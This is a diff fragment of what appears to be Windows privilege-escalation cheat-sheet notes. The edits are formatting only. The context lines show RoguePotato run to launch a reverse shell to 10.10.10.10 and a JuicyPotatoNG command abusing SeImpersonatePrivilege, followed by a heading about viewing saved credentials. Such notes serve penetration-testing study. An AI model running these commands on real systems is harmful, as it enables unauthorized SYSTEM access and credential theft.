@@ -30,9 +30,10 @@ Now, in the "local service" reverse shell you triggered, run the RoguePotato exp
 
 C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
 
-#JuicyPotato (SeImpersonatePrivilege)
+# JuicyPotato (SeImpersonatePrivilege)
 
 https://github.com/antonioCoco/JuicyPotatoNG/releases
+
 JP -t * -p c:\users\file.bat
 
 # Посмотреть сохраненный креды
